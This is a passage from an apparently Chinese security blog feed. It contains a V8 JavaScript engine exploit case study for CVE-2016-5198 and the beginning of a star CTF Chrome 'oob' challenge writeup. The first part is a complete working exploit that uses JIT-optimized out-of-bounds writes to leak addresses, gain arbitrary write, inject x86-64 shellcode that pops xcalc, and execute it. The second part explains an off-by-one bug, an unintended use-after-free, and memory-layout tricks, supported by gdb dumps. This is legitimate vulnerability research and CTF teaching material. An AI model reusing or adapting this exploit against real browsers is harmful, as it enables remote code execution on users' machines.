alt=""></p><p><strong>于是我们先将func_addr写到backingstore，读到函数真正执行时候的code地址</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> l;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check3</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span></span><br><span class="line">l.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">l.xyz1 = addr             </span><br><span class="line">&#125;</span><br><span class="line">Ctor3();</span><br><span class="line">Check3(func_addr_float);</span><br><span class="line">f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line">shellcode_addr_float = f64[<span class="number">7</span>];</span><br><span class="line">print(<span class="string">"0x"</span>+(u2d(shellcode_addr_float)).toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">// gdb-peda$ job 0x108ed87359c1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c1: [JSArrayBuffer]</span></span><br><span class="line"><span class="comment">//  - map = 0x2d714c002db1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0x108ed8705599</span></span><br><span class="line"><span class="comment">//  - elements = 0x37191c982241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - internal fields: 2</span></span><br><span class="line"><span class="comment">//  - backing_store = 0x108ed8735a00-&gt;已经被改成了Function的地址</span></span><br><span class="line"><span class="comment">//  - byte_length = 512</span></span><br><span class="line"><span class="comment">//  - properties = &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  - internal fields = &#123;</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x108ed87359c1-1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c0:0x00002d714c002db10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed87359d0:0x000037191c9822410x0000020000000000</span></span><br><span class="line"><span class="comment">// 0x108ed87359e0:0x0000108ed8735a00-&gt;已经被改成了Function的地址0x0000000000000004</span></span><br><span class="line"><span class="comment">// 0x108ed87359f0:0x00000000000000000x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x0000108ed8735a01-1</span></span><br><span class="line"><span class="comment">// 0x108ed8735a00:0x00002d714c0040f10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed8735a10:0x000037191c9822410x000037191c982351</span></span><br><span class="line"><span class="comment">// 0x108ed8735a20:0x0000108ed872d8490x0000108ed8703951</span></span><br><span class="line"><span class="comment">// 0x108ed8735a30:0x000037191c984b210x000016396d105e00--&gt;shellcode_addr_float[7]</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// gdb-peda$ job 0x0000108ed8735a01</span></span><br><span class="line"><span class="comment">// 0x108ed8735a01: [Function]</span></span><br><span class="line"><span class="comment">//  - map = 0x2d714c0040f1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0x108ed87040b9</span></span><br><span class="line"><span class="comment">//  - elements = 0x37191c982241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - initial_map = </span></span><br><span class="line"><span class="comment">//  - shared_info = 0x108ed872d849 &lt;SharedFunctionInfo&gt;</span></span><br><span class="line"><span class="comment">//  - name = 0x37191c982471 &lt;String[0]: &gt;</span></span><br><span class="line"><span class="comment">//  - formal_parameter_count = 0</span></span><br><span class="line"><span class="comment">//  - context = 0x108ed8703951 &lt;FixedArray[235]&gt;</span></span><br><span class="line"><span class="comment">//  - literals = 0x37191c984b21 &lt;FixedArray[1]&gt;</span></span><br><span class="line"><span class="comment">//  - code = 0x16396d105da1 &lt;Code: FUNCTION&gt;</span></span><br></pre></td></tr></table></figure><p><strong>再将取得的函数真正执行时候执行的函数地址，写入到backingstore，从而通过它进行任意地址写，写入我们的shellcode</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Check3(shellcode_addr_float);</span><br><span class="line"><span class="comment">// pop /usr/bin/xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">shellcode[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">shellcode[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">shellcode[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">shellcode[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">shellcode[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">shellcode[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">shellcode[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br></pre></td></tr></table></figure><p>然后再执行这个被我们改了内容的函数，就可以弹计算器了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil_f();</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-075203.png" alt=""></p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> n;</span><br><span class="line"><span class="keyword">var</span> m;</span><br><span class="line"><span class="keyword">var</span> l;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// int-&gt;double</span></span><br><span class="line"><span class="comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// double-&gt;int</span></span><br><span class="line"><span class="comment">// u2d(floataddr)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="comment">// oob write empty_Fixed_Array, write object to null_str buffer</span></span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object addr</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print("0x"+u2d(3.4766863919133141e-308;</span></span><br><span class="line"><span class="comment">// print(d2u(0x0019000400007300/0x100000000,0x0019000400007300&amp;0xffffffff));</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check2</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span></span><br><span class="line">m.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">m.xyz1 = <span class="number">0x0</span>                 <span class="comment">// do not modify the value</span></span><br><span class="line">m.xyz2 = <span class="number">0x7000</span>     <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    m.xyz3 = addr </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check3</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span></span><br><span class="line">l.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">l.xyz1 = addr  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// JIT优化</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; ++i) &#123;</span><br><span class="line">    Ctor();</span><br><span class="line">    Ctor2();</span><br><span class="line">    Ctor3();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; ++i) &#123;</span><br><span class="line">    Check(<span class="literal">null</span>);</span><br><span class="line">    Check2(<span class="number">3.4766863919152113e-308</span>);</span><br><span class="line">    Check3(<span class="number">3.4766863919152113e-308</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor(); <span class="comment">// 初始化n</span></span><br><span class="line">Ctor2(); <span class="comment">// 初始化m</span></span><br><span class="line">Ctor3(); <span class="comment">// 初始化l</span></span><br><span class="line">print(<span class="string">"jsset is :"</span>);</span><br><span class="line">%DebugPrint(n);</span><br><span class="line"><span class="comment">// %DebugPrint(Check);</span></span><br><span class="line"><span class="comment">// read(1);//插入断点</span></span><br><span class="line">Check(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="literal">null</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line"><span class="keyword">var</span> ab_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+ab_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> ab_len_ptr = ab_addr+<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">ab_len_ptr_float = d2u(ab_len_ptr/<span class="number">0x100000000</span>,ab_len_ptr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">Check(evil_f);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line"><span class="keyword">var</span> func_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+func_addr.toString(<span class="number">16</span>));</span><br><span class="line">func_addr = func_addr - <span class="number">1</span>;</span><br><span class="line">func_addr_float = d2u(func_addr/<span class="number">0x100000000</span>,func_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">Check(<span class="built_in">String</span>(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// %DebugPrint(Check2);</span></span><br><span class="line"><span class="comment">// read(1);//插入断点                 </span></span><br><span class="line"></span><br><span class="line">Check2(ab_len_ptr_float);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Check3(func_addr_float);</span><br><span class="line"></span><br><span class="line">f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line">shellcode_addr_float = f64[<span class="number">7</span>];</span><br><span class="line">print(<span class="string">"0x"</span>+(u2d(shellcode_addr_float)).toString(<span class="number">16</span>));</span><br><span class="line">Check3(shellcode_addr_float);</span><br><span class="line"><span class="comment">// pop /usr/bin/xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">shellcode[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">shellcode[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">shellcode[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">shellcode[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">shellcode[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">shellcode[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">shellcode[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br><span class="line"></span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;case-study-cve-2016-5198&quot;&gt;&lt;a href=&quot;#case-study-cve-2016-5198&quot; class=&quot;headerlink&quot; title=&quot;case study:cve-2016-5198&quot;&gt;&lt;/a&gt;case study:cve
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>star ctf chrome oob writeup</title>
    <link href="http://eternalsakura13.com/2019/04/29/*ctf_oob/"/>
    <id>http://eternalsakura13.com/2019/04/29/*ctf_oob/</id>
    <published>2019-04-29T03:51:56.101Z</published>
    <updated>2019-05-01T07:12:37.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="star-ctf-chrome-oob-writeup"><a href="#star-ctf-chrome-oob-writeup" class="headerlink" title="star ctf chrome oob writeup"></a>star ctf chrome oob writeup</h1><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();<span class="comment">//check len&lt;=2,else return undefine</span></span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));----&gt;length off by one</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());----&gt;length off by one</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><p>可以看到在length这里有一个off-by-one</p><p>另外，这里有一个非预期的UAF，其实在Object::ToNumber(isolate, args.at<Object>(1)))可以触发回调，通过valueof或者Symbol.toPrimitive可以在这里将array的length改成0之后强制GC将其回收掉，然后重新喷内存占位，由于我们之前缓存了length，可以一开始用一个非常大的length，而此时占位的array是我们可控的，可以占位一个length比较小的array，于是就可以任意OOB，而不是off by one。<br>类似的做法参考CVE-2017-5053，应该也是可以这么利用的，我没做太多尝试，有兴趣的同学可以试一下，不过显然这种做法会非常不稳定。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>v8通过map来判断类型，通过off-by-one来修改map即可产生type confusion</p><h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><h3 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h3><p>通过splice控制array的内存排布紧邻。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> b = [&#123;&#125;, &#123;&#125;, ab, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//布局内存，让array连续存放</span></span><br><span class="line">a = a.splice(<span class="number">0</span>);</span><br><span class="line">b = b.splice(<span class="number">0</span>);</span><br><span class="line">c = c.splice(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>test如下：<br>可以看到如图所示的内存布局：<br>a elements的length位置存放的就是a obj的map了，于是a.oob(xxx)就可以将a的map给覆盖掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;0x33a1055ce0e1-&gt;0x33a1055ce0b1</span><br><span class="line">&#x2F;&#x2F;0x33a1055ce139-&gt;0x33a1055ce101</span><br><span class="line">&#x2F;&#x2F;0x33a1055ce191-&gt;0x33a1055ce159</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; x&#x2F;60gx 0x33a1055ce0b1-1</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0b0: &#123;0x000033a10f4814f9 0x0000000400000000-&gt;a elements</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0c0: 0x3ff199999999999a 0x3ff199999999999a</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0d0: 0x3ff199999999999a 0x3ff199999999999a&#125;</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0e0: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;a obj</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0f0: 0x000033a1055ce0b1 0x0000000400000000&#125;</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce100: &#123;0x000033a10f480801 0x0000000500000000-&gt;b elements</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce110: 0x000033a1055cdfc9 0x000033a1055ce001</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce120: 0x000033a1055cdf01 0x000033a12d09f3f9</span><br><span class="line">&#x2F;&#x2F; 